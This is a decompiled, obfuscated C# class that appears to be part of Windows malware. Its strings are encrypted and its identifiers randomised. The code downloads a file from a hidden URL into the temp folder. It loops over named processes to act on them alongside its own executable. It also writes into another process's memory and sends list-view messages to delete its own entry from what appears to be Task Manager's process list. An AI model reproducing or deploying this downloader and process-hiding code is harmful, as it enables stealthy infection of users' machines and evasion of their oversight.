using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace UmXkJLRjSLdPF;

internal sealed class rZQveulgguEq
{
	private struct jaFbHyuPEL
	{
		public uint fpWOirdvUVZwckO;

		public IntPtr qOMhFEGHXaOTE;

		public IntPtr sVTLNgqzFgaXzO;

		public uint zdpXeKlnVRQM;

		public uint lARCFsSfzzjGKg;

		public IntPtr HlOvjKnsTlJ;

		public uint USLOLketqg;

		public int WLEfChnujClu;

		public IntPtr pmkWKkdyXq;
	}

	private static volatile bool TLwGRXmayPLzfu;

	public static volatile bool hURgeVqIRmhHQU;

	[NonSerialized]
	internal static GetString getString_0;

	public static string ryJfuqVkZMQab()
	{
		if (IntPtr.Size == 8)
		{
			zIVCbxjNHAKEFp.MtUpGNpuGgCpjQ = RNtVwERjCENcb(new Uri(zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107366628))));
		}
		else
		{
			zIVCbxjNHAKEFp.MtUpGNpuGgCpjQ = RNtVwERjCENcb(new Uri(zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107366450))));
		}
		return zIVCbxjNHAKEFp.MtUpGNpuGgCpjQ;
	}

	public static string RNtVwERjCENcb(Uri uri_0)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(getString_0(107368845), getString_0(107359779)).Remove(0, 3) + getString_0(107368840);
			WebClient webClient = new WebClient();
			webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process gCPBAnVeDotllbk(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(string_0))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void ssIkNmQcOfRPL(string[] string_0)
	{
		string text = ryJfuqVkZMQab();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string string_ in string_0)
			{
				Process process = gCPBAnVeDotllbk(string_);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(text, text2 + getString_0(107358287) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(text, text2 + getString_0(107358287) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + getString_0(107365824));
					zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(text, text2 + getString_0(107358287) + zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107365815)));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0, int int_1);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr JHDltSHDgGf);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr UCPDzRLBkOE, IntPtr othKthvGSXszCb, byte[] wicieJZZwSdBl, uint MqvMpMRkLpGwjC, out UIntPtr maKtBivxmCf);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr kUJMJCQPVApqdb, IntPtr IXhPfuhgDqUyz, [Out] byte[] GYuSsCCDbolMEA, int rFVNgNVSMFwc, out UIntPtr QXQJfuayqRhP);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr KulblQFRWPxeDPG, out uint eVRknKfjNovW);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	private static byte[] KIbQDUScOacP(object object_0)
	{
		int num = Marshal.SizeOf(object_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr nCvfuiFFoQVju(uint uint_0)
	{
		return OpenProcess(56, bool_0: false, uint_0);
	}

	private static void yfsLRMeEIwwMse(IntPtr intptr_0)
	{
		CloseHandle(intptr_0);
	}

	private static IntPtr EDAQnkyJhlje(uint uint_0, IntPtr intptr_0)
	{
		return VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);
	}

	private static void TcGUkjjbubgU(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
	{
		VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);
	}

	private static IntPtr pgYMeBLicyi()
	{
		IntPtr intPtr = FindWindow(getString_0(107365790), getString_0(107365733));
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow(getString_0(107365732), getString_0(107365723));
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107365732), null);
			return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107365674), getString_0(107365685));
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107365732), null);
		return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107365674), getString_0(107365640));
	}

	private static IntPtr FrkQtFGKVKL(IntPtr intptr_0)
	{
		return SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void lTohPtLNCMl(IntPtr intptr_0, IntPtr intptr_1)
	{
		SendMessage(intptr_0, 4104u, intptr_1, IntPtr.Zero);
	}

	private static void iZUIaMjnFPq(IntPtr intptr_0)
	{
		SendMessage(intptr_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string bCbLfeLHCPehF(IntPtr intptr_0, IntPtr intptr_1)
	{
		byte[] array = new byte[50];
		jaFbHyuPEL jaFbHyuPEL = default(jaFbHyuPEL);
		GetWindowThreadProcessId(intptr_0, out var eVRknKfjNovW);
		IntPtr intPtr = nCvfuiFFoQVju(eVRknKfjNovW);
		IntPtr intPtr2 = EDAQnkyJhlje((uint)Marshal.SizeOf(jaFbHyuPEL), intPtr);
		IntPtr intPtr3 = EDAQnkyJhlje(50u, intPtr);
		jaFbHyuPEL.qOMhFEGHXaOTE = intptr_1;
		jaFbHyuPEL.sVTLNgqzFgaXzO = (IntPtr)0;
		jaFbHyuPEL.USLOLketqg = 50u;
		jaFbHyuPEL.HlOvjKnsTlJ = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, KIbQDUScOacP(jaFbHyuPEL), (uint)Marshal.SizeOf(jaFbHyuPEL), out var maKtBivxmCf);
		SendMessage(intptr_0, 4141u, intptr_1, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out maKtBivxmCf);
		TcGUkjjbubgU(intPtr, intPtr2, (uint)Marshal.SizeOf(jaFbHyuPEL));
		TcGUkjjbubgU(intPtr, intPtr3, 50u);
		yfsLRMeEIwwMse(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void mblokWTVdUJOi(string string_0)
	{
		IntPtr intPtr = pgYMeBLicyi();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)FrkQtFGKVKL(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = bCbLfeLHCPehF(intPtr, (IntPtr)i);
			if (text.Contains(string_0))
			{
				lTohPtLNCMl(intPtr, (IntPtr)i);
			}
		}
	}

	private static void hUaEYizsqeIdHx()
	{
		IntPtr intPtr = pgYMeBLicyi();
		if (intPtr != IntPtr.Zero)
		{
			iZUIaMjnFPq(intPtr);
			iZUIaMjnFPq(intPtr);
			iZUIaMjnFPq(intPtr);
			iZUIaMjnFPq(intPtr);
			iZUIaMjnFPq(intPtr);
		}
	}

	public static void krzjYnZNregOD()
	{
		Thread thread = new Thread(pviAyyuzjBl);
		thread.Start();
	}

	private static void pviAyyuzjBl()
	{
		while (!TLwGRXmayPLzfu)
		{
			if (hURgeVqIRmhHQU)
			{
				mblokWTVdUJOi(Process.GetCurrentProcess().ProcessName + getString_0(107368840));
				Thread.Sleep(525);
			}
			else
			{
				hUaEYizsqeIdHx();
				Thread.Sleep(1000);
			}
		}
		TLwGRXmayPLzfu = false;
	}

	static rZQveulgguEq()
	{
		Strings.CreateGetStringDelegate(typeof(rZQveulgguEq));
		TLwGRXmayPLzfu = false;
		hURgeVqIRmhHQU = true;
	}
}
